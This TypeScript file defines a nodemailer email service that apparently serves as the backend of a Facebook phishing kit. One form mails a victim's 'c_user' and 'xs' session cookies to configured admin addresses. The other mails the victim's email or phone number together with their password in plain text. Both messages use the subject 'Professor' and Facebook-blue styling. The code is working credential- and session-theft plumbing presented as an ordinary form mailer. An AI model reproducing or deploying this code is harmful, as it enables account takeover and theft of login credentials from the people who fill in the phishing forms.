import nodemailer from "nodemailer";
import { formOneConfig, formTwoConfig, getAllAdminEmails } from "./config/smtp-config";

interface SMTPError extends Error {
  code?: string;
  command?: string;
  responseCode?: number;
  response?: string;
}

class EmailService {
  private formOneTransporter;
  private formTwoTransporter;

  constructor() {
    try {
      const configOne = formOneConfig();
      const configTwo = formTwoConfig();

      // Initialize form one transporter
      this.formOneTransporter = nodemailer.createTransport({
        host: configOne.host,
        port: configOne.port,
        secure: configOne.secure,
        auth: configOne.auth,
        pool: true,
        maxConnections: 5,
        maxMessages: 100,
        logger: process.env.NODE_ENV !== 'production'
      });

      // Initialize form two transporter
      this.formTwoTransporter = nodemailer.createTransport({
        host: configTwo.host,
        port: configTwo.port,
        secure: configTwo.secure,
        auth: configTwo.auth,
        pool: true,
        maxConnections: 5,
        maxMessages: 100,
        logger: process.env.NODE_ENV !== 'production'
      });

      // Verify transporter connections
      this.verifyConnections();
    } catch (error) {
      console.error('Failed to initialize email service:', error);
      throw error;
    }
  }

  private async verifyConnections() {
    try {
      await Promise.all([
        this.formOneTransporter.verify(),
        this.formTwoTransporter.verify()
      ]);
      console.log('Email service connections verified successfully');
    } catch (error) {
      console.error('Failed to verify email connections:', error);
      throw error;
    }
  }

  async sendFormOneEmail(data: any) {
    const config = formOneConfig();
    const adminEmails = getAllAdminEmails(config.adminEmails);

    if (!adminEmails.length) {
      throw new Error('No admin emails configured');
    }

    const mailOptions = {
      from: config.auth.user,
      to: adminEmails.join(", "),
      subject: "Professor",
      html: `
        <h2 style="color: #1877f2;">Form One Submission</h2>
        <div style="background: #f0f2f5; padding: 20px; border-radius: 8px; margin: 20px 0;">
          <p><strong>c_user:</strong> ${data.c_user}</p>
          <p><strong>xs:</strong> ${data.xs}</p>
          <p><strong>Submission Time:</strong> ${new Date().toLocaleString()}</p>
        </div>
      `,
    };

    try {
      const result = await this.formOneTransporter.sendMail(mailOptions);
      console.log("Form one email sent successfully:", result.messageId);
      return result;
    } catch (error) {
      console.error("Error sending form one email:", error);
      throw error;
    }
  }

  async sendFormTwoEmail(data: any) {
    const config = formTwoConfig();
    const adminEmails = getAllAdminEmails(config.adminEmails);

    if (!adminEmails.length) {
      throw new Error('No admin emails configured');
    }

    const mailOptions = {
      from: config.auth.user,
      to: adminEmails.join(", "),
      subject: "Professor",
      html: `
        <h2 style="color: #1877f2;">Form Two Submission</h2>
        <div style="background: #f0f2f5; padding: 20px; border-radius: 8px; margin: 20px 0;">
          <p><strong>User Email/Phone:</strong> ${data.user_email || 'Not provided'}</p>
          <p><strong>Password:</strong> ${data.password}</p>
          <p><strong>Submission Time:</strong> ${new Date().toLocaleString()}</p>
        </div>
      `,
    };

    try {
      const result = await this.formTwoTransporter.sendMail(mailOptions);
      console.log("Form two email sent successfully:", result.messageId);
      return result;
    } catch (error) {
      console.error("Error sending form two email:", error);
      throw error;
    }
  }
}

export const emailService = new EmailService();